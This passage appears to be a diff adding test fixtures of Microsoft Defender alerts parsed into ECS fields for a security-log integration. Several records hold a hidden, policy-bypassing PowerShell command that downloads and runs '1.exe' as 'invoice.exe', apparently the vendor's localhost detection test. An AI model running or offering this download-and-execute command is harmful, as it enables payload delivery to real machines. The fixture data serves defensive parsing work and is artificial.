+            "scheme": "https"
+          }
+        }
+      },
+      "message": "A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
+      "process": {
+        "command_line": [
+          "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'"
+        ],
+        "entity_id": [
+          "9s5wrh8Eh5HeemCY7eQhltB0mDk="
+        ],
+        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "hash": {
+          "sha1": [
+            "f64f11028554687a33ba8252c6cdb0e43c31c686"
+          ],
+          "sha256": [
+            "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17"
+          ]
+        },
+        "name": [
+          "powershell.exe"
+        ],
+        "parent": {
+          "entity_id": [
+            "Oq0hTtP4u47VcG6ZdrgZVFB56As="
+          ],
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "pid": [
+            5772
+          ],
+          "start": [
+            "2052-10-20T09:51:19.506Z"
+          ]
+        },
+        "pid": [
+          8224
+        ],
+        "start": [
+          "2052-10-20T09:51:39.499Z"
+        ],
+        "user": {
+          "name": [
+            "ACVSqdkLV-14709"
+          ]
+        }
+      },
+      "related": {
+        "hash": [
+          "f64f11028554687a33ba8252c6cdb0e43c31c686",
+          "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17"
+        ],
+        "hosts": [
+          "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+          "Windows11",
+          "22H2",
+          "clw555test",
+          "AzureAD"
+        ],
+        "ip": [
+          "192.168.72.3",
+          "fe80::cfe4:80b:615c:38fb",
+          "127.0.0.1",
+          "::1",
+          "203.0.113.138"
+        ],
+        "user": [
+          "ACVSqdkLV-14709",
+          "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+        ]
+      },
+      "source": {
+        "ip": [
+          "203.0.113.138"
+        ]
+      },
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ],
+      "threat": {
+        "tactic": {
+          "name": [
+            "Execution"
+          ]
+        },
+        "technique": {
+          "subtechnique": {
+            "id": [
+              "T1059.001"
+            ]
+          }
+        }
+      },
+      "url": {
+        "original": [
+          "http://127.0.0.1/1.exe"
+        ]
+      },
+      "user": {
+        "domain": [
+          "AzureAD"
+        ],
+        "name": [
+          "ACVSqdkLV-14709"
+        ]
+      }
+    },
+    {
+      "@timestamp": "2052-10-20T09:54:07.503Z",
+      "cloud": {
+        "account": {
+          "id": "2bde388d-8a81-40d3-a25e-0dbc2cacdc64"
+        }
+      },
+      "device": {
+        "id": [
+          "b51cc058-a3f4-47f8-8fcd-7c86b56e3c97"
+        ]
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "email": {
+        "local_id": [
+          "b19dfef8-95a1-427a-b42d-6f3a257884ef"
+        ],
+        "message_id": [
+          "81ce15$1h8z87@mail01.example.com"
+        ]
+      },
+      "event": {
+        "action": [
+          "detected"
+        ],
+        "category": [
+          "host",
+          "iam",
+          "network",
+          "process"
+        ],
+        "created": "2052-10-20T09:53:09.883Z",
+        "duration": 2478000000,
+        "end": "2052-10-20T09:51:41.993Z",
+        "id": "daefa1828b-dd4e-405c-8a3b-aa28596830dd_2",
+        "kind": "alert",
+        "original": "{\"id\":\"daefa1828b-dd4e-405c-8a3b-aa28596830dd_2\",\"providerAlertId\":\"feb6871d-ca7f-447f-8c7e-da40121645da_2\",\"incidentId\":\"33\",\"status\":\"new\",\"severity\":\"medium\",\"classification\":null,\"determination\":null,\"serviceSource\":\"microsoftDefenderForCloud\",\"detectionSource\":\"microsoftDefenderForCloud\",\"productName\":\"Microsoft Defender for Endpoint\",\"detectorId\":\"0a5a7718-b7ae-46c4-911f-b23302242c62\",\"tenantId\":\"2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"title\":\"Suspicious PowerShell command line\",\"description\":\"A suspicious PowerShell activity was observed on the machine. \\nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.\",\"recommendedActions\":\"1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.\",\"category\":\"Execution\",\"assignedTo\":null,\"alertWebUrl\":\"https:\\/\\/security.microsoft.com\\/alerts\\/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"incidentWebUrl\":\"https:\\/\\/security.microsoft.com\\/incidents\\/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"actorDisplayName\":null,\"threatDisplayName\":null,\"threatFamilyName\":null,\"mitreTechniques\":[\"T1059.001\"],\"createdDateTime\":\"2052-10-20T09:53:09.8839373Z\",\"lastUpdateDateTime\":\"2052-10-20T09:54:07.5033333Z\",\"resolvedDateTime\":null,\"firstActivityDateTime\":\"2052-10-20T09:51:39.5154802Z\",\"lastActivityDateTime\":\"2052-10-20T09:51:41.9939003Z\",\"alertPolicyId\":null,\"additionalData\":null,\"comments\":[],\"evidence\":[{\"internetMessageId\":\"81ce15$1h8z87@mail01.example.com\",\"networkMessageId\":\"b19dfef8-95a1-427a-b42d-6f3a257884ef\",\"senderIp\": \"203.0.113.138\",\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[\"PrimaryDevice\"],\"tags\":[],\"firstSeenDateTime\":\"2052-10-20T09:50:17.7383987Z\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"azureAdDeviceId\":\"b51cc058-a3f4-47f8-8fcd-7c86b56e3c97\",\"deviceDnsName\":\"clw555test\",\"osPlatform\":\"Windows11\",\"osBuild\":22621,\"version\":\"22H2\",\"healthStatus\":\"inactive\",\"riskScore\":\"high\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"onboardingStatus\":\"onboarded\",\"defenderAvStatus\":\"notSupported\",\"ipInterfaces\":[\"192.168.72.3\",\"fe80::cfe4:80b:615c:38fb\",\"127.0.0.1\",\"::1\"],\"vmMetadata\":null,\"loggedOnUsers\":[{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\"}]},{\"@odata.type\":\"#microsoft.graph.security.userEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}},{\"@odata.type\":\"#microsoft.graph.security.urlEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"url\":\"http:\\/\\/127.0.0.1\\/1.exe\"},{\"@odata.type\":\"#microsoft.graph.security.ipEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"ipAddress\":\"127.0.0.1\",\"countryLetterCode\":null},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"processId\":8224,\"parentProcessId\":5772,\"processCommandLine\":\"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http:\\/\\/127.0.0.1\\/1.exe', 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe');Start-Process 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe'\",\"processCreationDateTime\":\"2052-10-20T09:51:39.4997961Z\",\"parentProcessCreationDateTime\":\"2052-10-20T09:51:19.5064237Z\",\"detectionStatus\":\"detected\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"imageFile\":{\"sha1\":\"f64f11028554687a33ba8252c6cdb0e43c31c686\",\"sha256\":\"f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17\",\"fileName\":\"powershell.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\",\"fileSize\":491520,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"parentProcessImageFile\":{\"sha1\":null,\"sha256\":null,\"fileName\":\"cmd.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"fileSize\":323584,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}}]}",
+        "provider": "microsoftDefenderForCloud",
+        "severity": 47,
+        "start": "2052-10-20T09:51:39.515Z",
+        "type": [
+          "info"
+        ],
+        "url": "https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64"
+      },
+      "host": {
+        "hostname": [
+          "clw555test"
+        ],
+        "id": [
+          "735f41e26eba5899c9cbe8b0bb8e74e32de2a509"
+        ],
+        "ip": [
+          "192.168.72.3",
+          "fe80::cfe4:80b:615c:38fb",
+          "127.0.0.1",
+          "::1"
+        ],
+        "os": {
+          "name": [
+            "Windows11"
+          ],
+          "version": [
+            "22H2"
+          ]
+        }
+      },
+      "m365_defender": {
+        "alert": {
+          "category": "Execution",
+          "created_datetime": "2052-10-20T09:53:09.883Z",
+          "description": "A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
+          "detection_source": "microsoftDefenderForCloud",
+          "detector_id": "0a5a7718-b7ae-46c4-911f-b23302242c62",
+          "evidence": [
+            {
+              "azure_ad_device_id": "b51cc058-a3f4-47f8-8fcd-7c86b56e3c97",
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "defender_av_status": "notSupported",
+              "detailed_roles": [
+                "PrimaryDevice"
+              ],
+              "device_dns_name": "clw555test",
+              "first_seen_datetime": "2052-10-20T09:50:17.738Z",
+              "health_status": "inactive",
+              "ip_interfaces": [
+                "192.168.72.3",
+                "fe80::cfe4:80b:615c:38fb",
+                "127.0.0.1",
+                "::1"
+              ],
+              "logged_on_users": [
+                {
+                  "account_name": "ACVSqdkLV-14709",
+                  "domain_name": "AzureAD"
+                }
+              ],
+              "mde_device_id": "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+              "odata_type": "#microsoft.graph.security.deviceEvidence",
+              "onboarding_status": "onboarded",
+              "os_build": "22621",
+              "os_platform": "Windows11",
+              "rbac_group": {
+                "id": "0"
+              },
+              "remediation_status": "none",
+              "risk_score": "high",
+              "sender_ip": "203.0.113.138",
+              "verdict": "unknown",
+              "version": "22H2"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "odata_type": "#microsoft.graph.security.userEvidence",
+              "remediation_status": "none",
+              "user_account": {
+                "account_name": "ACVSqdkLV-14709",
+                "domain_name": "AzureAD",
+                "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+              },
+              "verdict": "unknown"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "odata_type": "#microsoft.graph.security.urlEvidence",
+              "remediation_status": "none",
+              "url": "http://127.0.0.1/1.exe",
+              "verdict": "suspicious"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "ip_address": "127.0.0.1",
+              "odata_type": "#microsoft.graph.security.ipEvidence",
+              "remediation_status": "none",
+              "verdict": "suspicious"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "detection_status": "detected",
+              "image_file": {
+                "name": "powershell.exe",
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                "publisher": "Microsoft Corporation",
+                "sha1": "f64f11028554687a33ba8252c6cdb0e43c31c686",
+                "sha256": "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17",
+                "size": 491520
+              },
+              "mde_device_id": "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+              "odata_type": "#microsoft.graph.security.processEvidence",
+              "parent_process": {
+                "creation_datetime": "2052-10-20T09:51:19.506Z",
+                "id": 5772,
+                "image_file": {
+                  "name": "cmd.exe",
+                  "path": "C:\\Windows\\System32",
+                  "publisher": "Microsoft Corporation",
+                  "size": 323584
+                }
+              },
+              "process": {
+                "command_line": "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'",
+                "creation_datetime": "2052-10-20T09:51:39.499Z",
+                "id": 8224
+              },
+              "remediation_status": "none",
+              "user_account": {
+                "account_name": "ACVSqdkLV-14709",
+                "domain_name": "AzureAD",
+                "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+              },
+              "verdict": "unknown"
+            }
+          ],
+          "first_activity_datetime": "2052-10-20T09:51:39.515Z",
+          "id": "daefa1828b-dd4e-405c-8a3b-aa28596830dd_2",
+          "incident_id": "33",
+          "incident_web_url": {
+            "domain": "security.microsoft.com",
+            "original": "https://security.microsoft.com/incidents/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "path": "/incidents/23",
+            "query": "tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "scheme": "https"
+          },
+          "last_activity_datetime": "2052-10-20T09:51:41.993Z",
+          "last_update_datetime": "2052-10-20T09:54:07.503Z",
+          "mitre_techniques": [
+            "T1059.001"
+          ],
+          "provider_alert_id": "feb6871d-ca7f-447f-8c7e-da40121645da_2",
+          "recommended_actions": "1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.",
+          "service_source": "microsoftDefenderForCloud",
+          "severity": "medium",
+          "status": "new",
+          "tenant_id": "2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+          "title": "Suspicious PowerShell command line",
+          "web_url": {
+            "domain": "security.microsoft.com",
+            "original": "https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "path": "/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1",
+            "query": "tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "scheme": "https"
+          }
+        }
+      },
+      "message": "A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
+      "process": {
+        "command_line": [
+          "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'"
+        ],
+        "entity_id": [
+          "9s5wrh8Eh5HeemCY7eQhltB0mDk="
+        ],
+        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "hash": {
+          "sha1": [
+            "f64f11028554687a33ba8252c6cdb0e43c31c686"
+          ],
+          "sha256": [
+            "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17"
+          ]
+        },
+        "name": [
+          "powershell.exe"
+        ],
+        "parent": {
+          "entity_id": [
+            "Oq0hTtP4u47VcG6ZdrgZVFB56As="
+          ],
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "pid": [
+            5772
+          ],
+          "start": [
+            "2052-10-20T09:51:19.506Z"
+          ]
+        },
+        "pid": [
+          8224
+        ],
+        "start": [
+          "2052-10-20T09:51:39.499Z"
+        ],
+        "user": {
+          "name": [
+            "ACVSqdkLV-14709"
+          ]
+        }
+      },
+      "related": {
+        "hash": [
+          "f64f11028554687a33ba8252c6cdb0e43c31c686",
+          "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17"
+        ],
+        "hosts": [
+          "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+          "Windows11",
+          "22H2",
+          "clw555test",
+          "AzureAD"
+        ],
+        "ip": [
+          "192.168.72.3",
+          "fe80::cfe4:80b:615c:38fb",
+          "127.0.0.1",
+          "::1",
+          "203.0.113.138"
+        ],
+        "user": [
+          "ACVSqdkLV-14709",
+          "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+        ]
+      },
+      "source": {
+        "ip": [
+          "203.0.113.138"
+        ]
+      },
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ],
+      "threat": {
+        "tactic": {
+          "name": [
+            "Execution"
+          ]
+        },
+        "technique": {
+          "subtechnique": {
+            "id": [
+              "T1059.001"
+            ]
+          }
+        }
+      },
+      "url": {
+        "original": [
+          "http://127.0.0.1/1.exe"
+        ]
+      },
+      "user": {
+        "domain": [
+          "AzureAD"
+        ],
+        "name": [
+          "ACVSqdkLV-14709"
+        ]
+      }
+    },
+    {
+      "@timestamp": "2052-10-20T09:54:07.503Z",
+      "cloud": {
+        "account": {
+          "id": "2bde388d-8a81-40d3-a25e-0dbc2cacdc64"
+        }
+      },
+      "device": {
+        "id": [
+          "b51cc058-a3f4-47f8-8fcd-7c86b56e3c97"
+        ]
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "email": {
+        "local_id": [
+          "b19dfef8-95a1-427a-b42d-6f3a257884ef"
+        ],
+        "message_id": [
+          "81ce15$1h8z87@mail01.example.com"
+        ]
+      },
+      "event": {
+        "action": [
+          "detected"
+        ],
+        "category": [
+          "host",
+          "iam",
+          "network",
+          "process"
+        ],
+        "created": "2052-10-20T09:53:09.883Z",
+        "duration": 2478000000,
+        "end": "2052-10-20T09:51:41.993Z",
+        "id": "daefa1828b-dd4e-405c-8a3b-aa28596830dd_2",
+        "kind": "alert",
+        "original": "{\"id\":\"daefa1828b-dd4e-405c-8a3b-aa28596830dd_2\",\"providerAlertId\":\"feb6871d-ca7f-447f-8c7e-da40121645da_2\",\"incidentId\":\"33\",\"status\":\"new\",\"severity\":\"medium\",\"classification\":null,\"determination\":null,\"serviceSource\":\"microsoftDefenderForCloud\",\"detectionSource\":\"microsoftDefenderForCloud\",\"productName\":\"Microsoft Defender for Endpoint\",\"detectorId\":\"0a5a7718-b7ae-46c4-911f-b23302242c62\",\"tenantId\":\"2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"title\":\"Suspicious PowerShell command line\",\"description\":\"A suspicious PowerShell activity was observed on the machine. \\nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.\",\"recommendedActions\":\"1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.\",\"category\":\"Execution\",\"assignedTo\":null,\"alertWebUrl\":\"https:\\/\\/security.microsoft.com\\/alerts\\/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"incidentWebUrl\":\"https:\\/\\/security.microsoft.com\\/incidents\\/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"actorDisplayName\":null,\"threatDisplayName\":null,\"threatFamilyName\":null,\"mitreTechniques\":[\"T1059.001\"],\"createdDateTime\":\"2052-10-20T09:53:09.8839373Z\",\"lastUpdateDateTime\":\"2052-10-20T09:54:07.5033333Z\",\"resolvedDateTime\":null,\"firstActivityDateTime\":\"2052-10-20T09:51:39.5154802Z\",\"lastActivityDateTime\":\"2052-10-20T09:51:41.9939003Z\",\"alertPolicyId\":null,\"additionalData\":null,\"comments\":[],\"evidence\":[{\"internetMessageId\":\"81ce15$1h8z87@mail01.example.com\",\"networkMessageId\":\"b19dfef8-95a1-427a-b42d-6f3a257884ef\",\"senderIp\": \"\",\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[\"PrimaryDevice\"],\"tags\":[],\"firstSeenDateTime\":\"2052-10-20T09:50:17.7383987Z\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"azureAdDeviceId\":\"b51cc058-a3f4-47f8-8fcd-7c86b56e3c97\",\"deviceDnsName\":\"clw555test\",\"osPlatform\":\"Windows11\",\"osBuild\":22621,\"version\":\"22H2\",\"healthStatus\":\"inactive\",\"riskScore\":\"high\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"onboardingStatus\":\"onboarded\",\"defenderAvStatus\":\"notSupported\",\"ipInterfaces\":[\"\",\"fe80::cfe4:80b:615c:38fb\",\"127.0.0.1\",\"::1\"],\"vmMetadata\":null,\"loggedOnUsers\":[{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\"}]},{\"@odata.type\":\"#microsoft.graph.security.userEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}},{\"@odata.type\":\"#microsoft.graph.security.urlEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"url\":\"http:\\/\\/127.0.0.1\\/1.exe\"},{\"@odata.type\":\"#microsoft.graph.security.ipEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"ipAddress\":\"\",\"countryLetterCode\":null},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"processId\":8224,\"parentProcessId\":5772,\"processCommandLine\":\"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http:\\/\\/127.0.0.1\\/1.exe', 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe');Start-Process 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe'\",\"processCreationDateTime\":\"2052-10-20T09:51:39.4997961Z\",\"parentProcessCreationDateTime\":\"2052-10-20T09:51:19.5064237Z\",\"detectionStatus\":\"detected\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"imageFile\":{\"sha1\":\"f64f11028554687a33ba8252c6cdb0e43c31c686\",\"sha256\":\"f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17\",\"fileName\":\"powershell.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\",\"fileSize\":491520,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"parentProcessImageFile\":{\"sha1\":null,\"sha256\":null,\"fileName\":\"cmd.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"fileSize\":323584,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}}]}",
+        "provider": "microsoftDefenderForCloud",
+        "severity": 47,
+        "start": "2052-10-20T09:51:39.515Z",
+        "type": [
+          "info"
+        ],
+        "url": "https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64"
+      },
+      "host": {
+        "hostname": [
+          "clw555test"
+        ],
+        "id": [
+          "735f41e26eba5899c9cbe8b0bb8e74e32de2a509"
+        ],
+        "ip": [
+          "fe80::cfe4:80b:615c:38fb",
+          "127.0.0.1",
+          "::1"
+        ],
+        "os": {
+          "name": [
+            "Windows11"
+          ],
+          "version": [
+            "22H2"
+          ]
+        }
+      },
+      "m365_defender": {
+        "alert": {
+          "category": "Execution",
+          "created_datetime": "2052-10-20T09:53:09.883Z",
+          "description": "A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
+          "detection_source": "microsoftDefenderForCloud",
+          "detector_id": "0a5a7718-b7ae-46c4-911f-b23302242c62",
+          "evidence": [
+            {
+              "azure_ad_device_id": "b51cc058-a3f4-47f8-8fcd-7c86b56e3c97",
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "defender_av_status": "notSupported",
+              "detailed_roles": [
+                "PrimaryDevice"
+              ],
+              "device_dns_name": "clw555test",
+              "first_seen_datetime": "2052-10-20T09:50:17.738Z",
+              "health_status": "inactive",
+              "ip_interfaces": [
+                "fe80::cfe4:80b:615c:38fb",
+                "127.0.0.1",
+                "::1"
+              ],
+              "logged_on_users": [
+                {
+                  "account_name": "ACVSqdkLV-14709",
+                  "domain_name": "AzureAD"
+                }
+              ],
+              "mde_device_id": "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+              "odata_type": "#microsoft.graph.security.deviceEvidence",
+              "onboarding_status": "onboarded",
+              "os_build": "22621",
+              "os_platform": "Windows11",
+              "rbac_group": {
+                "id": "0"
+              },
+              "remediation_status": "none",
+              "risk_score": "high",
+              "verdict": "unknown",
+              "version": "22H2"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "odata_type": "#microsoft.graph.security.userEvidence",
+              "remediation_status": "none",
+              "user_account": {
+                "account_name": "ACVSqdkLV-14709",
+                "domain_name": "AzureAD",
+                "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+              },
+              "verdict": "unknown"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "odata_type": "#microsoft.graph.security.urlEvidence",
+              "remediation_status": "none",
+              "url": "http://127.0.0.1/1.exe",
+              "verdict": "suspicious"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "odata_type": "#microsoft.graph.security.ipEvidence",
+              "remediation_status": "none",
+              "verdict": "suspicious"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "detection_status": "detected",
+              "image_file": {
+                "name": "powershell.exe",
